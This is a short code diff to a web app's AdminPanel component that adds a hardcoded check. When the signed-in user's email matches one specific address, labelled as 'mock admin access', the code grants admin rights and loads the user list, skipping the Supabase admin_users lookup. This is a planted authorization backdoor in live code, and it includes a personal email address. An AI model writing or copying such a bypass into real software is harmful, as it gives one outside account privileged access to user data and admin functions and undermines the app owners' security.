@@ -91,6 +91,13 @@ export default function AdminPanel() {
             return;
         }
 
+        // Mock Admin Access for specific user
+        if (user.email === 'wallisom_53@outlook.com') {
+            setIsAdmin(true);
+            loadUsers();
+            return;
+        }
+
         try {
             const { data, error } = await supabase
                 .from('admin_users')
